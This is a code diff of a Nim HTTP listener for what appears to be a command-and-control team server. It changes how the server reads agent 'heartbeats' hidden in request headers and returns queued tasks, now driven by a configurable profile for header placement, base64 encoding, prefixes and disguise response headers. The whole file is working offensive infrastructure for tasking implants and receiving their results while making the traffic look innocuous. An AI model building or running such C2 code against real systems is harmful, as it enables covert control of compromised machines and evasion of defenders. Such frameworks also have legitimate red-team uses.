@@ -1,4 +1,4 @@
-import prologue, json, terminal, strformat
+import prologue, json, terminal, strformat, parsetoml, tables
 import sequtils, strutils, times, base64
 
 import ./handlers
@@ -9,75 +9,113 @@ proc error404*(ctx: Context) {.async.} =
     resp "", Http404
 
 #[
-    GET /tasks
+    GET
     Called from agent to check for new tasks
 ]#
 proc httpGet*(ctx: Context) {.async.} = 
 
-    # Check headers
-    # Heartbeat data is hidden base64-encoded within "Authorization: Bearer" header, between a prefix and suffix 
-    if not ctx.request.hasHeader("Authorization"): 
-        resp "", Http404 
-        return 
+    {.cast(gcsafe).}:
 
-    let checkinData: seq[byte] = string.toBytes(decode(ctx.request.getHeader("Authorization")[0].split(".")[1]))
+        # Check heartbeat metadata placement
+        var heartbeat: seq[byte]
+        var heartbeatString: string
+        let heartbeatPlacement = cq.profile["http-get"]["agent"]["heartbeat"]["placement"]["type"].getStr()
 
-    try: 
-        var response: seq[byte]
-        let tasks: seq[seq[byte]] = getTasks(checkinData)
+        case heartbeatPlacement: 
+        of "header": 
+            let heartbeatHeader = cq.profile["http-get"]["agent"]["heartbeat"]["placement"]["name"].getStr()
+            if not ctx.request.hasHeader(heartbeatHeader): 
+                resp "", Http404 
+                return
 
-        if tasks.len <= 0: 
-            resp "", Http200
-            return
+            heartbeatString = ctx.request.getHeader(heartbeatHeader)[0]
 
-        # Create response, containing number of tasks, as well as length and content of each task
-        # This makes it easier for the agent to parse the tasks
-        response.add(cast[uint8](tasks.len))
+        of "parameter": 
+            discard 
+        of "uri": 
+            discard 
+        of "body": 
+            discard
+        else: discard 
 
-        for task in tasks:
-            response.add(uint32.toBytes(uint32(task.len))) 
-            response.add(task)
-        
-        await ctx.respond(
-            code = Http200,
-            body = Bytes.toString(response)
-        )
+        # Retrieve and apply data transformation to get raw heartbeat packet
+        let 
+            encoding = cq.profile["http-get"]["agent"]["heartbeat"]["encoding"]["type"].getStr("none")
+            prefix = cq.profile["http-get"]["agent"]["heartbeat"]["prefix"].getStr("")
+            suffix = cq.profile["http-get"]["agent"]["heartbeat"]["suffix"].getStr("")
 
-        # Notify operator that agent collected tasks
-        {.cast(gcsafe).}:
+        let encHeartbeat = heartbeatString[len(prefix) ..^ len(suffix) + 1]
+
+        case encoding: 
+        of "base64":
+            heartbeat = string.toBytes(decode(encHeartbeat)) 
+        of "none":
+            heartbeat = string.toBytes(encHeartbeat) 
+
+        try: 
+            var response: seq[byte]
+            let tasks: seq[seq[byte]] = getTasks(heartbeat)
+
+            if tasks.len <= 0: 
+                resp "", Http200
+                return
+
+            # Create response, containing number of tasks, as well as length and content of each task
+            # This makes it easier for the agent to parse the tasks
+            response.add(cast[uint8](tasks.len))
+
+            for task in tasks:
+                response.add(uint32.toBytes(uint32(task.len))) 
+                response.add(task)
+            
+            # Add headers, as defined in the team server profile 
+            for header, value in cq.profile["http-get"]["server"]["headers"].getTable():
+                ctx.response.setHeader(header, value.getStr())
+
+            await ctx.respond(Http200, Bytes.toString(response), ctx.response.headers)
+            ctx.handled = true # Ensure that HTTP response is sent only once 
+
+            # Notify operator that agent collected tasks
             let date = now().format("dd-MM-yyyy HH:mm:ss")
             cq.writeLine(fgBlack, styleBright, fmt"[{date}] [*] ", resetStyle, fmt"{$response.len} bytes sent.")
 
-    except CatchableError:
-        resp "", Http404
+        except CatchableError:
+            resp "", Http404
 
 #[
-    POST /results
-    Called from agent to post results of a task
+    POST 
+    Called from agent to register itself or post results of a task
 ]#
 proc httpPost*(ctx: Context) {.async.} = 
     
-    # Check headers
-    # If POST data is not binary data, return 404 error code
-    if ctx.request.contentType != "application/octet-stream": 
-        resp "", Http404
-        return
+    {.cast(gcsafe).}:
 
-    try:        
-        # Differentiate between registration and task result packet
-        var unpacker = Unpacker.init(ctx.request.body)
-        let header = unpacker.deserializeHeader()
+        # Check headers
+        # If POST data is not binary data, return 404 error code
+        if ctx.request.contentType != "application/octet-stream": 
+            resp "", Http404
+            return
 
-        if cast[PacketType](header.packetType) == MSG_REGISTER: 
-            if not register(string.toBytes(ctx.request.body)):
-                resp "", Http400
-                return
+        try:        
+            # Differentiate between registration and task result packet
+            var unpacker = Unpacker.init(ctx.request.body)
+            let header = unpacker.deserializeHeader()
+
+            # Add response headers, as defined in team server profile
+            for header, value in cq.profile["http-post"]["server"]["headers"].getTable():
+                ctx.response.setHeader(header, value.getStr())
+
+            if cast[PacketType](header.packetType) == MSG_REGISTER: 
+                if not register(string.toBytes(ctx.request.body)):
+                    resp "", Http400
+                    return
+
+            elif cast[PacketType](header.packetType) == MSG_RESULT: 
+                handleResult(string.toBytes(ctx.request.body))
+
             resp "", Http200
-            
-        elif cast[PacketType](header.packetType) == MSG_RESULT: 
-            handleResult(string.toBytes(ctx.request.body))
 
-    except CatchableError:
-        resp "", Http404
+        except CatchableError:
+            resp "", Http404
 
-    return
+        return
